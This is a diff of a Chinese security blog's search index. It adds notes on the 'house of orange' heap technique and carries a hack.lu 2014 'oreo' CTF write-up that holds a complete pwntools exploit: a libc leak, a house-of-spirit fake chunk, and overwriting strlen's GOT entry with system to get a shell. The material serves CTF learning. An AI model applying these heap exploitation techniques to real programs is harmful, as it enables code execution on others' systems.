@@ -1,6 +1,20 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[堆利用学习之house of orange]]></title>
+    <url>%2Fpost%2Ff8f8701e.html</url>
+    <content type="text"><![CDATA[终于学到了house of orange，看了无数师傅的博客，终于马马虎虎理清了一点思路，还是得写点笔记以免忘掉。 概述house of orange是来自Hitcon CTF 2016中的一道同名题目，其中使用了一种全新的攻击手段（现在也不新了2333），攻击的主要思路是利用 unsorted attack 修改 _IO_list_all 指针，并伪造 _IO_FILE_plus 结构体及其vtable（虚表）来劫持控制流。直接上题目好了。。。 题目描述程序菜单：123456789+++++++++++++++++++++++++++++++++++++@ House of Orange @+++++++++++++++++++++++++++++++++++++ 1. Build the house 2. See the house 3. Upgrade the house 4. Give up +++++++++++++++++++++++++++++++++++++Your choice : 程序保护全开_(:зゝ∠)_:12345CANARY : ENABLEDFORTIFY : ENABLEDNX : ENABLEDPIE : ENABLEDRELRO : FULL 程序分析build函数： 用户输入house的名字、orange的颜色和价格，并使用两个结构体保存。 结构体：123400000000 house struc ; (sizeof=0x10, mappedto_6)00000000 orange dq ?00000008 name dq ?00000010 house ends 123400000000 orange struc ; (sizeof=0x8, mappedto_7)00000000 price dd ?00000004 color dd ?00000008 orange ends 限制了只能build四次，每次build会申请3个chunk，其中只有第二个chunk（house name）可以控制大小，且最大为0x10001234567891011121314house = (house *)malloc(0x10uLL);printf("Length of name :");size = get_num();if ( size &gt; 0x1000 ) size = 4096;house-&gt;name = (__int64)malloc(size);if ( !house-&gt;name )&#123; puts("Malloc error !!!"); exit(1);&#125;printf("Name :");get_str((void *)house-&gt;name, size);orange = (orange *)calloc(1uLL, 8uLL); upgrade函数： 修改house的name、orange的颜色和价格，只能修改最近build的house。 123456printf("Length of name :");v2 = get_num();if ( v2 &gt; 0x1000 ) v2 = 4096;printf("Name:");get_str((void *)qword_203068[1], v2); 修改name的地方没有检查size的大小，所以存在堆溢出 see函数 打印house的名字、orange的价格等，同样只能打印最近build的house。 漏洞分析泄露libc基址和堆地址发现程序中没有free函数，导致常规的堆利用方法都很难使用，这便是house of orange的核心之一——在没有free函数的情况下得到一个释放的堆块（unsorted bin），从而泄露数据。 原理考虑这么一种情况，假设在malloc时，程序中的bins里都没有合适的chunk，同时top chunk的大小已经不够用来分配这块内存了。那么此时程序将会调用sysmalloc来向系统申请更多的空间，而我们的目的则是在sysmalloc中的_int_free()，以此来获得一块释放的堆块。1234567else&#123; void *p = sysmalloc (nb, av); //调用sysmalloc来分配内存 if (p != NULL) alloc_perturb (p, bytes); return p;&#125; 对于堆来说有两种拓展方式，一是通过改变brk来拓展堆，二是通过mmap的方式。其中只有brk拓展的方式才会调用到_int_free()将老的top chunk释放掉，所以还需要满足一些条件。123456789// 如果所需分配的chunk大小大于mmap分配阈值，默认为128K，// 并且当前进程使用mmap()分配的内存块小于设定的最大值// 则将使用mmap()if (av == NULL || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) &#123; //使用mmap() &#125; 由上诉代码可知，要想使用brk拓展，需要满足chunk size &lt; 0x‭20000‬同时，在使用brk拓展之前，还会进行一系列check。12345678// 如果top chunk没有初始化，则size为0// top chunk的大小需要 &gt;= MINSIZE(有师傅的博客说在64位下是0x20)// top chunk的inuse位需要是 1// 检查是否对齐到内存页assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; pagemask) == 0)); 这里主要关注如何对齐到内存页。现代操作系统都是以内存页为单位进行内存管理的，一般内存页大小为4kb(0x1000)，那么top chunk的size加上top chunk的地址所得到的值是和0x1000对齐的。如：0x602020+0x20fe0=0x623000。 整理以上代码，所需的条件有： 分配的chunk大小小于0x‭20000，大于top chunk‬的size top chunk大小大于 MINSIZE（不能太小就行） top chunk的inuse为 1 top chunk的大小要对齐到内存页 满足了以上各种条件之后，就可以成功的调用_int_free()来释放top chunk12345/* If possible, release the rest. */if (old_size &gt;= MINSIZE)&#123; _int_free (av, old_top, 1);//调用_int_free，free old_top。&#125; 此后，原先的top chunk将被放入unsorted bin中。下一次分配时，就将会从unsorted bin中切割合适的大小，而切割下来的chunk的fd和bk的值将会是libc中的地址了，同时，若该chunk是large chunk，在fd_nextsize和bk_nextsizez中还会储存堆中的地址。由此便可以完成泄露了。 利用过程 先build一个house，通过upgrade从name溢出到top chunk，将top chunk的大小改为0xfa1（name chunk的大小为0x20） 12345670x55e0ebd68000: 0x0000000000000000 0x0000000000000021 &lt;== house0x55e0ebd68010: 0x000055e0ebd68050 0x000055e0ebd680300x55e0ebd68020: 0x0000000000000000 0x0000000000000021 &lt;== name0x55e0ebd68030: 0x6161616161616161 0x61616161616161610x55e0ebd68040: 0x6161616161616161 0x0000000000000021 &lt;== orange0x55e0ebd68050: 0x0000001f00000008 0x00000000000000000x55e0ebd68060: 0x0000000000000000 0x0000000000000fa1 &lt;== top chunk 申请一个大于top chunk的空间，触发brk来拓展top chunk。原top chunk将会被放入unsorted bin 123//因为不是同一次运行，地址可能和前面不匹配unsortedbinall: 0x7f7ab34f37b8 (main_arena+88) —▸ 0x5598255700a0 ◂— 0x7f7ab34f37b8 再申请一个大小合适的large chunk，该chunk将会从unsorted bin中切割下来。 12345pwndbg&gt; x/32gx 0x559d1a1d40c00x559d1a1d40c0: 0x0000000000000000 0x00000000000004110x559d1a1d40d0: 0x6161616161616161 0x00007f732b8fddc8 &lt;== libc0x559d1a1d40e0: 0x0000559d1a1d40c0 0x0000559d1a1d40c0 &lt;== heap0x559d1a1d40f0: 0x0000000000000000 0x0000000000000000 调用see()，输出name时，将会把libc的地址泄露出来。再调用upgrade()，把bk也全部填充为’a’，那么下一次see()就可以泄露出heap的地址。 unsortedbin attack//TODO]]></content>
+      <categories>
+        <category>堆利用学习</category>
+      </categories>
+      <tags>
+        <tag>堆利用</tag>
+        <tag>house_of_orange</tag>
+        <tag>IO_FILE</tag>
+        <tag>unsortedbin_attack</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[hack.lu2014-oreo writeup]]></title>
     <url>%2Fpost%2F1b661c73.html</url>
     <content type="text"><![CDATA[题目描述题目来源：hack.lu CTF 2014知识点：house of spirit挺老的一道题目了，不过是how2heap和ctfwiki上的例题。题目是一个买卖枪支的系统，同样是常规的增删查改，32位程序。12345678910Welcome to the OREO Original Rifle Ecommerce Online System!What would you like to do?1. Add new rifle2. Show added rifles3. Order selected rifles4. Leave a Message with your Order5. Show current stats6. Exit!Action: 保护如下：123456[*] &apos;/home/nick/pwn_learn/heapLearn/house_of_spirit/hack-lu2014_oreo&apos; Arch: i386-32-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE 程序概况add函数：12345678910111213v1 = head;head = (char *)malloc(56u);if ( head )&#123; *((_DWORD *)head + 13) = v1; printf("Rifle name: "); fgets(head + 25, 56, stdin); sub_80485EC(head + 25); printf("Rifle description: "); fgets(head, 56, stdin); sub_80485EC(head); ++cnt;&#125; 函数会读取名称和描述，并将名称、描述以及上一个枪支的地址一起存入结构体中，构成一个链表结构。结构体如下：1234500000000 rifle struc ; (sizeof=0x38, mappedto_5)00000000 description db 25 dup(?)00000019 name db 27 dup(?)00000034 next dd ?00000038 rifle ends 同时注意到，fgets函数读取的长度为56个字节，所以可以发生溢出。 show函数：123456for ( i = head; i; i = (rifle *)i-&gt;next )&#123; printf("Name: %s\n", i-&gt;name); printf("Description: %s\n", i); puts("===================================");&#125; 通过链表依次访问每个枪支，输出名称和描述。 Free函数(Order)：遍历链表，依次将所有枪支都free掉，然后将链表头置0 message函数：向dword_804A2A8指向的地址写入字符串。而在程序开头dword_804A2A8 = (char *)&amp;unk_804A2C0;，所以是向unk_804A2C0处写入。1234567.bss:0804A2A8 dword_804A2A8 dd ? ; DATA XREF: leave_message+23↑r.bss:0804A2A8 ; leave_message+3C↑r ....bss:0804A2AC align 20h.bss:0804A2C0 unk_804A2C0 db ? ; ; DATA XREF: main+29↑o.bss:0804A2C1 db ? ;.bss:0804A2C2 db ? ;.bss:0804A2C3 db ? ; 漏洞分析泄露libc基址因为程序通过链表来管理枪支，恰好在枪支结构体中存在溢出，所以可以通过从name溢出到next指针，将next修改到任意地址，再通过show就可以任意地址读了。这里可以通过泄露puts_got,然后通过偏移来算出libc基址。 house of spirit因为可以控制next指针，也就意味着可以在任意地方free，那么可以构造house of spirit。如果可以在massage指针dword_804A2A8处布置好一个fake chunk用于绕过free的检查，那么就可以在此处分配一个chunk，massage指针将会被控制，从而实现任意地址写。 构造fake chunk若要让dword_804A2A8在chunk内部，首先需要在它的上方构造出这个chunk的size，可以发现，在对枪支进行计数的cnt变量刚好在0x804A2A4的位置，所以只需要添加一定数量的枪支，就可以达到我们想要的size。12345678.bss:0804A2A0 dword_804A2A0 dd ? ; DATA XREF: Free+5A↑r.bss:0804A2A0 ; Free+62↑w ....bss:0804A2A4 cnt dd ? ; DATA XREF: add+C5↑r.bss:0804A2A4 ; add+CD↑w ....bss:0804A2A8 ; char *dword_804A2A8.bss:0804A2A8 dword_804A2A8 dd ? ; DATA XREF: leave_message+23↑r.bss:0804A2A8 ; leave_message+3C↑r ....bss:0804A2AC align 20h 因为一个枪支结构体的大小为0x38，加上chunk header后的size属于0x40这个fast bin，所以需要将fake chunk的size设置为0x40，也就是添加0x40个枪支然后需要绕过对next chunk的检查，通过写入message，将对应next chunk的size和prevsize都构造好。（详见exp）构造好后：1234560x804a288: 0x00000000 0x00000000 0x00000000 0x000000000x804a298: 0x00000000 0x00000000 0x00000001 0x00000041 &lt;== size0x804a2a8: 0x0804a2c0 0x00000000 0x00000000 0x00000000 &lt;== message指针0x804a2b8: 0x00000000 0x00000000 0x00000000 0x000000000x804a2c8: 0x00000000 0x00000000 0x00000000 0x000000000x804a2d8: 0x00000000 0x00000000 0x00000040 0x00000050 &lt;== prevsize size 实现任意地址写在fake chunk构造好后，就可以将dword_804A2A8写入next指针，然后free，在message指针处构造好的fake chunk将会进入fast bin。重新添加枪支，fake chunk将会从bins中取出，通过设置枪支的description，就可以修改massage指针了，此时在调用message函数就能实现任意地址写 注意 程序中没有setvbuf，所以不会及时的回显数据，在编写exp时有些时候不用recv exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p = process('./hack-lu2014_oreo')elf = ELF('./hack-lu2014_oreo')libc = ELF('/lib/i386-linux-gnu/libc-2.19.so')def add(name, description): p.sendline('1') p.sendline(name) p.sendline(description)def show(): p.sendline('2') p.recvuntil('=\n')def free(): p.sendline('3')def leaveMsg(msg): p.sendline('4') p.sendline(msg)def leak(addr): add('a'*27 + p32(addr), 'a') show() p.recvuntil('Description: ') p.recvuntil('Description: ') res = u32(p.recvuntil('\n', drop=True)[:4]) p.recvuntil('\n') return res#泄露libclibc_base = leak(elf.got['puts']) - libc.symbols['puts']system = libc_base + libc.symbols['system']print "libc_base : %#x" % libc_baseprint "system : %#x" % system#添加0x40个枪支，构造size位for _ in range(0x40-1): add('a', 'a')#将massage指针的地址写到next指针中add('a'*27 + p32(0x0804A2A8), 'a')#构造next chunk，将prevsize设为0x40，size设为0x50payload = '\x00'*0x20 + p32(0x40) + p32(0x50)leaveMsg(payload)#把fake chunk放入fast binfree()p.recvuntil('Okay order submitted!\n')#重新把fake chunk分配出来，并在description写入strlen_got，相当于将message指针改为指向strlen的got表add('a' ,p32(elf.got['strlen']))#写入message，相当于向strlen_got中写入system。#因为在leaveMsg函数中，fgets之后就会调用strlen，所以顺便就可以getshell了#这里使用分号是因为linux命令中可以使用';'来分割两条指令，所以这里相当于把/bin/sh当做第二条执行的指令了，而第一个p32(system)是个无效指令罢了leaveMsg(p32(system) + ';/bin/sh')p.interactive() 相关链接题目链接：oreowriteup参考：ctfwiki]]></content>
@@ -9,9 +23,9 @@
       </categories>
       <tags>
         <tag>writeup</tag>
-        <tag>ctfwiki</tag>
-        <tag>堆利用</tag>
         <tag>how2heap</tag>
+        <tag>堆利用</tag>
+        <tag>ctfwiki</tag>
         <tag>house_of_spirit</tag>
       </tags>
   </entry>
@@ -23,11 +37,11 @@
         <category>writeups</category>
       </categories>
       <tags>
-        <tag>writeup</tag>
-        <tag>堆利用</tag>
         <tag>unlink</tag>
-        <tag>double_free</tag>
+        <tag>writeup</tag>
         <tag>how2heap</tag>
+        <tag>堆利用</tag>
+        <tag>double_free</tag>
       </tags>
   </entry>
   <entry>
@@ -51,9 +65,9 @@
       </categories>
       <tags>
         <tag>writeup</tag>
-        <tag>ctfwiki</tag>
-        <tag>堆利用</tag>
         <tag>how2heap</tag>
+        <tag>堆利用</tag>
+        <tag>ctfwiki</tag>
         <tag>fastbin_attack</tag>
       </tags>
   </entry>
@@ -66,9 +80,9 @@
       </categories>
       <tags>
         <tag>writeup</tag>
+        <tag>堆利用</tag>
         <tag>off_by_one</tag>
         <tag>ctfwiki</tag>
-        <tag>堆利用</tag>
       </tags>
   </entry>
   <entry>
@@ -79,10 +93,10 @@
         <category>writeups</category>
       </categories>
       <tags>
-        <tag>writeup</tag>
-        <tag>堆利用</tag>
         <tag>unlink</tag>
+        <tag>writeup</tag>
         <tag>how2heap</tag>
+        <tag>堆利用</tag>
       </tags>
   </entry>
   <entry>
@@ -93,9 +107,9 @@
         <category>writeups</category>
       </categories>
       <tags>
+        <tag>unlink</tag>
         <tag>writeup</tag>
         <tag>堆利用</tag>
-        <tag>unlink</tag>
       </tags>
   </entry>
   <entry>
@@ -106,8 +120,8 @@
         <category>堆利用学习</category>
       </categories>
       <tags>
-        <tag>堆利用</tag>
         <tag>unlink</tag>
+        <tag>堆利用</tag>
       </tags>
   </entry>
   <entry>
